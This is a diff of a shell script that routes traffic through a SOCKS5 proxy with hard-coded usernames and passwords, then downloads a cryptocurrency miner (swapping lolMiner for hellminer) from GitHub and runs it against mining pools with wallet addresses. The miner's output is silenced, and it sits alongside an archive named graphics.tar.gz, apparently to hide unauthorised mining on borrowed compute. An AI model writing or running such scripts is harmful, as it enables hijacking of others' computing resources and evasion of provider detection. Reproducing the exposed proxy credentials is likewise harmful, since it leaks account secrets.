@@ -13,9 +13,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = us-east-static-09.quotaguard.com:1080
-socks5_username = 7amdbgj23nyn0e
-socks5_password = khisr9gjnuxw049kbtldkaqtrcor
+socks5 = 156.238.6.241:80
+socks5_username = nofvbdys-rotate
+socks5_password = 44tpywm4q9bo
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -27,8 +27,7 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz
-tar -xhf lolMiner_v1.42_Lin64.tar.gz
-cd 1.42
+./graftcp/graftcp wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz  
 
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool stratum+ssl://eth-sg.flexpool.io:5555 --user 0xB9e4408EcF7b38fF785877118F1E4928e0D35AD6.a  >/dev/null &
+./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RGqsZZa1gUE8zzcF9nxAgE583eEsDgG6Nn.tes -p x --cpu 4
